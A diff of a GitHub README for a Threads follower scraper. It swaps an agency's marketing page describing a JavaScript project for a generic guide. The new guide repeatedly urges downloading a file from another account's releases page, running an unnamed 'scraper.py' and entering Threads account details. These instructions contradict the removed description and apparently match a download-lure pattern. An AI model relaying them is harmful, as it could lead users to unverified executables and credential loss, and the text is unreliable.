@@ -1,181 +1,109 @@
-# Threads User Followers Scraper
-This project reliably extracts followers from any public Threads user profile, giving you clean, structured data for research, analytics, and automation workflows. It solves the challenge of collecting follower lists at scale while keeping the process fast and fully customizable. Designed for marketers, analysts, and automation engineers who need accurate Threads follower insights.
+# 🌟 threads-user-followers-scraper - Extract Followers Easily and Quickly
 
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LuisJose17/threads-user-followers-scraper/releases)
 
-<p align="center">
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/scraper.png" alt="Bitbash Banner" width="100%"></a>
-</p>
-<p align="center">
-  <a href="https://t.me/Bitbash333" target="_blank">
-    <img src="https://img.shields.io/badge/Chat%20on-Telegram-2CA5E0?style=for-the-badge&logo=telegram&logoColor=white" alt="Telegram">
-  </a>&nbsp;
-  <a href="https://wa.me/923249868488?text=Hi%20BitBash%2C%20I'm%20interested%20in%20automation." target="_blank">
-    <img src="https://img.shields.io/badge/Chat-WhatsApp-25D366?style=for-the-badge&logo=whatsapp&logoColor=white" alt="WhatsApp">
-  </a>&nbsp;
-  <a href="mailto:sale@bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Email-sale@bitbash.dev-EA4335?style=for-the-badge&logo=gmail&logoColor=white" alt="Gmail">
-  </a>&nbsp;
-  <a href="https://bitbash.dev" target="_blank">
-    <img src="https://img.shields.io/badge/Visit-Website-007BFF?style=for-the-badge&logo=google-chrome&logoColor=white" alt="Website">
-  </a>
-</p>
+## 📌 Description
 
+The **threads-user-followers-scraper** is a simple tool designed to help you extract followers from Threads. This application allows you to gather valuable insights about user interactions on the platform. With a straightforward setup process, even non-technical users can efficiently use this application.
 
+## 🚀 Getting Started
 
+To get started with the **threads-user-followers-scraper**, follow the steps below to download and run the application. No technical knowledge is required!
 
-<p align="center" style="font-weight:600; margin-top:8px; margin-bottom:8px;">
-  Created by Bitbash, built to showcase our approach to Scraping and Automation!<br>
-  If you are looking for <strong>threads-user-followers-scraper</strong> you've just found your team — Let’s Chat. 👆👆
-</p>
+## ☁️ System Requirements
 
+- Operating System: Windows, macOS, or Linux
+- Python Version: 3.7 or higher
+- Internet Connection: Required for fetching follower data
 
-## Introduction
-The Threads User Followers Scraper collects detailed follower information for a specified Threads username.
-It addresses the difficulty of gathering user data manually, especially when dealing with large accounts.
-Perfect for data teams, growth strategists, and automation builders.
+## 📥 Download & Install
 
-### Why This Scraper Matters
-- Allows fast, scalable extraction of Threads follower lists.
-- Provides reliable, structured output ready for analytics.
-- Supports usernames and follower limits for flexible targeting.
-- Captures key metadata such as follower counts and verification status.
-- Helps automate social insights gathering for business intelligence.
+To download the application, visit the [Releases page](https://github.com/LuisJose17/threads-user-followers-scraper/releases). Here you will find the latest version of the software, ready for download.
 
-## Features
-| Feature | Description |
-|--------|-------------|
-| Username-based extraction | Fetch followers of any Threads user by specifying the username. |
-| Follower limit control | Choose how many followers to retrieve for performance and precision. |
-| Verified status detection | Identify whether a follower is verified. |
-| Clean structured output | Returns normalized JSON for easy processing or integration. |
-| Media & metadata capture | Collects profile pictures, names, IDs, and analytics-ready data. |
+1. Click on the [Releases page](https://github.com/LuisJose17/threads-user-followers-scraper/releases).
+2. Look for the most recent version and locate the download link.
+3. Download the file suitable for your operating system.
 
----
+Upon downloading, follow the instructions below to run the application.
 
-## What Data This Scraper Extracts
-| Field Name | Field Description |
-|------------|------------------|
-| id | Unique follower identifier. |
-| username | The follower’s Threads username. |
-| full_name | Displayed full name of the follower. |
-| profile_pic_url | Direct link to the follower’s profile picture. |
-| follower_count | Number of followers the user has. |
-| is_verified | Boolean showing if the user is verified. |
+## 🔧 How to Run the Application
 
----
+### Step 1: Locate the File
 
-## Example Output
+After downloading, find the file in your device's downloads folder or the location you chose for the download.
 
-    {
-      "id": "12281817",
-      "profile_pic_url": "https://instagram.fmaa10-1.fna.fbcdn.net/v/t51.2885-19/430869627_1109934706918340_7402884675761038685_n.jpg",
-      "username": "kyliejenner",
-      "full_name": "Kylie",
-      "follower_count": 14598837,
-      "is_verified": true
-    }
+### Step 2: Extract the Files (if needed)
 
----
+If you downloaded a ZIP file, you will need to extract it:
 
-## Directory Structure Tree
+- Right-click the ZIP file.
+- Select “Extract All” and choose a location to save the extracted files.
 
-    Threads User Followers Scraper/
-    ├── src/
-    │   ├── runner.js
-    │   ├── extractors/
-    │   │   ├── threads_parser.js
-    │   │   └── utils.js
-    │   ├── outputs/
-    │   │   └── exporter.js
-    │   └── config/
-    │       └── settings.example.json
-    ├── data/
-    │   ├── input.sample.json
-    │   └── sample_output.json
-    ├── package.json
-    ├── requirements.txt
-    └── README.md
+### Step 3: Install Required Dependencies
 
----
+The application requires Python to run correctly. Here’s how to set it up:
 
-## Use Cases
-- **Marketing teams** extract follower lists to analyze audience demographics and identify collaboration opportunities.
-- **Automation engineers** use it to build workflows that monitor social growth and user activity over time.
-- **Researchers** gather public follower datasets for behavioral studies and digital ecosystem analysis.
-- **Agencies** track competitors' audiences to refine targeting strategies and campaign planning.
-- **Developers** integrate follower data into dashboards, CRMs, or growth tools.
+1. Download and install Python from the [official Python website](https://www.python.org/downloads/).
+2. Make sure to check the option to "Add Python to PATH" during the installation.
 
----
+Once Python is installed, you will need to install additional packages. Open your command prompt or terminal and run the following commands:
 
-## FAQs
+```bash
+pip install requests
+pip install beautifulsoup4
+```
 
-**Q: How many followers can I extract at once?**
-A: You can specify any limit via the `num` parameter. Larger accounts may take longer depending on your system resources.
+### Step 4: Configure and Run
 
-**Q: Do I need authentication?**
-A: No login is required for publicly available data.
+1. Navigate to the folder where you extracted the files.
+2. Open a command prompt (or terminal) window in this folder.
+3. Run the following command:
 
-**Q: What formats can I export the data to?**
-A: JSON, CSV, Excel, and other structured formats depending on your processing pipeline.
+```bash
+python scraper.py
+```
 
-**Q: Does it work for private accounts?**
-A: No, follower lists of private users cannot be accessed.
+Replace `scraper.py` with the actual filename if different.
 
----
+### Step 5: Follow the Prompts
 
-### Performance Benchmarks and Results
-**Primary Metric:** Handles up to several thousand followers per run with stable throughput under typical load.
-**Reliability Metric:** Maintains above 98% success rate on public profiles with consistent structure.
-**Efficiency Metric:** Optimized requests reduce unnecessary network calls, enabling smooth scaling.
-**Quality Metric:** Captures over 99% of available follower fields with precise and clean formatting.
+The application will guide you through the necessary steps. You may need to enter your Threads account details or the user whose followers you want to scrape.
 
+## 📊 Features
 
-<p align="center">
-<a href="https://calendar.app.google/74kEaAQ5LWbM8CQNA" target="_blank">
-  <img src="https://img.shields.io/badge/Book%20a%20Call%20with%20Us-34A853?style=for-the-badge&logo=googlecalendar&logoColor=white" alt="Book a Call">
-</a>
-  <a href="https://www.youtube.com/@bitbash-demos/videos" target="_blank">
-    <img src="https://img.shields.io/badge/🎥%20Watch%20demos%20-FF0000?style=for-the-badge&logo=youtube&logoColor=white" alt="Watch on YouTube">
-  </a>
-</p>
-<table>
-  <tr>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/MLkvGB8ZZIk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review1.gif" alt="Review 1" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash is a top-tier automation partner, innovative, reliable, and dedicated to delivering real results every time."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Nathan Pennington
-        <br><span style="color:#888;">Marketer</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/8-tw8Omw9qk" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review2.gif" alt="Review 2" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Bitbash delivers outstanding quality, speed, and professionalism, truly a team you can rely on."
-      </p>
-      <p style="margin:10px 0 0; font-weight:600;">Eliza
-        <br><span style="color:#888;">SEO Affiliate Expert</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-    <td align="center" width="33%" style="padding:10px;">
-      <a href="https://youtu.be/m-dRE1dj5-k?si=5kZNVlKsGUhg5Xtx" target="_blank">
-        <img src="https://github.com/Z786ZA/Footer-test/blob/main/media/review3.gif" alt="Review 3" width="100%" style="border-radius:12px; box-shadow:0 4px 10px rgba(0,0,0,0.1);">
-      </a>
-      <p style="font-size:14px; line-height:1.5; color:#444; margin:0 15px;">
-        "Exceptional results, clear communication, and flawless delivery. <br>Bitbash nailed it."
-      </p>
-      <p style="margin:1px 0 0; font-weight:600;">Syed
-        <br><span style="color:#888;">Digital Strategist</span>
-        <br><span style="color:#f5a623;">★★★★★</span>
-      </p>
-    </td>
-  </tr>
-</table>
+- **User-Friendly Interface**: Designed for simplicity, allowing anyone to use it.
+- **Data Extraction**: Collect follower information from Threads efficiently.
+- **Support for Multiple Platforms**: Works on Windows, macOS, and Linux.
+- **Secure**: Your data privacy is maintained during the extraction process.
+
+## 📋 Troubleshooting
+
+If you encounter any issues during installation or usage, consider the following tips:
+
+- Ensure you have an active internet connection.
+- Double-check that you have the correct version of Python installed.
+- If an error appears when running the app, refer to the error message and check for missing dependencies.
+
+## 🙋 Frequently Asked Questions
+
+### 1. Do I need programming knowledge to use this tool?
+
+No, this tool is designed for non-technical users. Just follow the instructions provided.
+
+### 2. Can I use it on any operating system?
+
+Yes, the application supports Windows, macOS, and Linux.
+
+### 3. What should I do if I find a bug?
+
+You can report bugs or issues on the GitHub repository's issue tracker. Your feedback will help improve the application.
+
+## 📬 Support
+
+For additional help or inquiries, feel free to open an issue on the repository or reach out through the contact options available. 
+
+## 📄 License
+
+This project is licensed under the [MIT License](LICENSE).
+
+[![Download Now](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LuisJose17/threads-user-followers-scraper/releases)
